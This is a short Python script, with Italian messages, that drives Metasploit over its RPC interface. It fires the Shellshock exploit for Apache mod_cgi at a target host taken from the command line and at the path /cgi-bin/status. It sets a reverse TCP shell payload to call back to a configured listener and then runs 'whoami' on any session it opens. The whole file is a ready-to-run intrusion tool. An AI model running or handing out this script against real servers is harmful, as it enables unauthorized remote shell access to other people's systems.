from pymetasploit3.msfrpc import MsfRpcClient
from config import *

client = MsfRpcClient(PWD, port=55552)
exploit = client.modules.use('exploit', 'multi/http/apache_mod_cgi_bash_env_exec')

exploit['RHOSTS']=sys.argv[1]
exploit['RPORT']="80"
exploit['TARGETURI']="/cgi-bin/status"
payload = client.modules.use('payload', 'linux/x86/shell/reverse_tcp')
payload['LHOST'] = LHOST
payload['LPORT'] = LPORT
var = exploit.execute(payload=payload)
print(var)
if var['job_id']==None:
    print("Exploit fallito")
else:
    print("Exploit riuscito")
    for s in client.sessions.list.keys():
        print(s)
        shell = client.sessions.session('1')
        shell.write('whoami')
        print(shell.read())
